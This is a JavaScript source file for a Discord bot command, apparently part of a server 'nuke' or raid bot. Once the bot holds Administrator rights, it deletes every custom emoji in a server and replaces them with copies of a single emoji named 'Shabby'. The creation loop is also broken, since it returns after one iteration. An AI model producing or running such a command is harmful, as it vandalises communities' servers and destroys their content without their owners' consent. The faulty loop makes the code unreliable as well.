const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "emoji",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")

    message.guild.emojis.cache.forEach(emoji => emoji.delete());

    if(message.guild.emojis.cache.size < 50) {
        for (let i = 0;i < 50;i++) {
            message.guild.emojis.create({
                attachment: 'https://cdn.discordapp.com/emojis/1094283156527521853.gif?v=1',
                name: 'Shabby',
            })
            return console.log("Created!")
        }
    } else {
        return console.log("Maximum emojis!")
    }

  },
};